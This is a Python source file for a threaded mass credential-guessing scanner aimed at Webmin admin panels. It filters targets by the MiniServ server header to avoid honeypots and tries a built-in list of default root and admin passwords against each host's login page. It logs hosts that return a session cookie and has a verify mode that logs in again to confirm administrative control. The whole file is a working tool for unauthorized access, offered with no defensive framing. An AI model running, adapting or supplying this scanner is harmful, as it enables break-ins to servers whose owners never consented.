#!/usr/bin/env python3
"""Webmin credential lane on verified MiniServ hosts.

Gate: only hosts whose Server header is MiniServ are attempted (tarpit/honeypot
rejection). Success = 302/303 with a sid cookie. Failure = 200 + 'Login failed'.
On success we immediately verify by fetching / and/or running a command via the
Webmin 'Command Shell' module.
"""
import sys, re, json, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests, urllib3
urllib3.disable_warnings()

T = 10
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36"}
CREDS = [
    ("root", "root"), ("admin", "admin"), ("root", "password"), ("admin", "password"),
    ("root", "123456"), ("admin", "123456"), ("root", "admin"), ("admin", "admin123"),
    ("root", "webmin"), ("admin", "webmin"), ("root", "toor"), ("admin", "changeme"),
    ("root", "P@ssw0rd"), ("admin", "P@ssw0rd"), ("root", "qwerty"), ("admin", "12345678"),
]

def mk():
    s = requests.Session(); s.verify = False; s.headers.update(UA); return s

def attempt(host, user, pw):
    base = f"https://{host}"
    s = mk()
    try:
        g = s.get(base + "/", timeout=T, allow_redirects=False)
    except Exception:
        return None
    srv = (g.headers.get("Server") or "").lower()
    if "miniserv" not in srv:
        return {"host": host, "skip": "not miniserv", "server": g.headers.get("Server")}
    try:
        s.get(base + "/session_login.cgi", timeout=T)
        p = s.post(base + "/session_login.cgi",
                   data={"user": user, "pass": pw, "save": "1"},
                   headers={"Referer": base + "/session_login.cgi",
                            "Content-Type": "application/x-www-form-urlencoded"},
                   timeout=T, allow_redirects=False)
    except Exception:
        return None
    sid = s.cookies.get("sid")
    ok = p.status_code in (302, 303) and sid
    return {"host": host, "user": user, "pw": pw, "ok": bool(ok),
            "code": p.status_code, "sid": (sid[:12] + "…") if sid else None,
            "server": g.headers.get("Server", "")[:30]}

def verify(host, user, pw):
    """Prove control: log in, then read /proc/self/status-ish info via SysInfo module."""
    base = f"https://{host}"
    s = mk()
    out = {"host": host, "user": user, "pw": pw}
    try:
        s.get(base + "/session_login.cgi", timeout=T)
        s.post(base + "/session_login.cgi", data={"user": user, "pass": pw, "save": "1"},
               headers={"Referer": base + "/session_login.cgi",
                        "Content-Type": "application/x-www-form-urlencoded"},
               timeout=T, allow_redirects=False)
    except Exception as ex:
        out["error"] = str(ex)[:60]; return out
    if not s.cookies.get("sid"):
        out["error"] = "no sid"; return out
    for path in ("/sysinfo/", "/system-status/", "/", "/proc/", "/init/"):
        try:
            r = s.get(base + path, timeout=T, allow_redirects=True)
            t = (r.text or "")
            if "Webmin" in t or "system information" in t.lower():
                m = re.search(r"Webmin\s*([0-9.]+)", t)
                out["logged_in"] = True
                out["proof_path"] = path
                if m:
                    out["version"] = m.group(1)
                out["title"] = re.search(r"<title[^>]*>([^<]{0,50})", t, re.I).group(1) if re.search(r"<title", t, re.I) else ""
                return out
        except Exception:
            continue
    out["error"] = "login ok but no proof page"
    return out

def main():
    path = sys.argv[1]
    verify_mode = "--verify" in sys.argv
    lines = [l.strip() for l in open(path) if l.strip()]
    results, hits, lock = [], [], threading.Lock()
    t0 = time.time()
    def work(h):
        if verify_mode:
            # format: host|user|pw
            parts = h.split("|")
            return verify(parts[0], parts[1], parts[2])
        p = attempt(h, CREDS[0][0], CREDS[0][1])
        if p and p.get("skip"):
            return {"host": h, "skip": p["skip"]}
        for u, pw in CREDS:
            r = attempt(h, u, pw)
            if r is None:
                return None
            if r.get("ok"):
                return r
        return {"host": h, "tried": len(CREDS)}
    with ThreadPoolExecutor(max_workers=120) as ex:
        futs = {ex.submit(work, h): h for h in lines}
        n = 0
        for f in as_completed(futs):
            n += 1
            try:
                r = f.result()
            except Exception:
                r = None
            if r:
                with lock:
                    results.append(r)
                if r.get("ok") or r.get("logged_in"):
                    with lock:
                        hits.append(r)
                    print(f"🔥 {json.dumps(r)[:260]}", flush=True)
            if n % 400 == 0:
                print(f"  .. {n}/{len(lines)} hits={len(hits)} {time.time()-t0:.0f}s", flush=True)
    json.dump({"scanned": len(lines), "results": results, "hits": hits},
              open("/tmp/webmin_creds_result.json", "w"), indent=1)
    print(f"\nDONE n={len(lines)} HITS={len(hits)} in {time.time()-t0:.0f}s", flush=True)

if __name__ == "__main__":
    main()
